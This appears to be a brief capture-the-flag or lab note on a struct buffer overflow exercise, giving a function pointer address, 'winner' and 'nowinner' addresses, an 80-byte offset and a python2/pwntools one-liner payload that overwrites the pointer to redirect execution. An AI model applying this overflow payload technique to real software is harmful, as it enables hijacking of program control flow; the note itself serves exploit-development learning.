fucntion pointer is at 0x004052f0 which is stored with nowinner address

no winner = 04011ef

winner = 04011d9

after 80 bytes we could overwrite the function pointer

python2 -c 'from pwn import *;print("A"*80+"\xd9\x11\x40")' > pay

we are overfollwing the buffer in the struct to overwrite the pointer in the next structure
